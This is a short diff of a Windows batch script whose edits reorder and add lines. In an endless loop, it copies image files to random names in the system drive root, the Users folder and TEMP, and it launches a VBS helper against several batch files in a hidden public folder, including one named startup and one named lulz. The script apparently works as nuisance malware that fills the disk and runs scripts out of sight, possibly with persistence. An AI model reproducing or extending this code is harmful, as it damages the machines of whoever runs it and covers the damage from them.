@@ -10,8 +10,10 @@ powershell cp %TEMP%\image3.png C:\%random%1.png
 powershell cp %TEMP%\image2.png C:\%random%1.png
 powershell cp %TEMP%\image3.png C:\Users\%random%1.png
 powershell cp %TEMP%\image2.png %TEMP%\%random%1.png
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\lulz.bat
 goto loop
